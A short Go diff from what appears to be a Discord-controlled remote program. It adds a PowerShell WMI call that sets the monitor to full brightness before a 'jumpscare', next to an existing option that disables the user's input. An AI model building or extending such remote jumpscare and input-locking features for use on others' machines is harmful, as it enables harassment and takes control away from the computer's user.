@@ -40,6 +40,14 @@ func (*ScareCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, 
 		funcs.DisableInputs(true)
 	}
 
+	if store.RuntimeSettings.JumpscareMaxBrightnessBefore {
+		utils.RunCommand(
+			"powershell",
+			"-c",
+			fmt.Sprintf("(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, %d)", 100),
+		)
+	}
+
 	var jumpscare strings.Builder
 	jumpscare.WriteString("Add-Type -AssemblyName System.Windows.Forms\n")
 	jumpscare.WriteString("Add-Type -AssemblyName System.Drawing\n")
